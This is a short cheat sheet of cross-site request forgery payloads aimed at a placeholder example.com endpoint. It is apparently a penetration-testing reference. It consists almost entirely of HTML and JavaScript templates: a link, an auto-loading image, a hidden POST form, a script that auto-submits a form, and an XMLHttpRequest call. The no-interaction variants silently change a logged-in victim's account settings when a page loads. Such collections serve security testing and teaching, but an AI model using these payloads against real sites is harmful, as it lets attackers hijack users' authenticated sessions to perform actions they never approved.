# CheatSheet -CSRF

### HTML GET - Requiring User Interaction

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### HTML GET - No User Interaction

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - Requiring User Interaction

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

### HTML POST - AutoSubmit - No User Interaction

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### JSON GET - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```